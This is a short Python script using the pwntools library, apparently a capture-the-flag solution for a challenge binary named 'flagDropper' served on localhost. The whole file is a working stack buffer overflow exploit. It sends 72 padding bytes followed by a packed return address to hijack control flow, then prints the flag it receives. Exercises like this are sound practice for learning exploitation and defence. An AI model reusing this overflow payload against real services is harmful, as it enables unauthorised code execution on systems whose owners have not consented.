from pwn import *
#p = process('./flagDropper')
#gdb.attach(p)
p = remote('localhost', 34251)
for i in range(4):
        p.recvline()
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + p64(0x00000000004005da))
print(p.recvuntil('}'))
